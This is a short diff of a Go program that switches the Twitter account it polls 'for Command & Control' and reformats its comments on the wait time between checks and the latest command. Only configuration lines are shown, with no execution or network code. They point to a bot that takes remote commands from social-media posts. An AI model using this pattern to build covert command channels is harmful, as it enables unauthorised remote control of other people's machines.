@@ -35,9 +35,9 @@ import (
 )
 
 var (
-	commander string = "loganj143"	// Twitter account for Command & Control
-	slumber time.Duration = 15		// Time to wait between checking for commands (in seconds)
-	cmd string = ""					// Latest command
+	commander string = "kanye"	// Twitter account for Command & Control
+	slumber time.Duration = 15	// Time to wait between checking for commands (in seconds)
+	cmd string = ""			// Latest command
 )
 
 func main() {
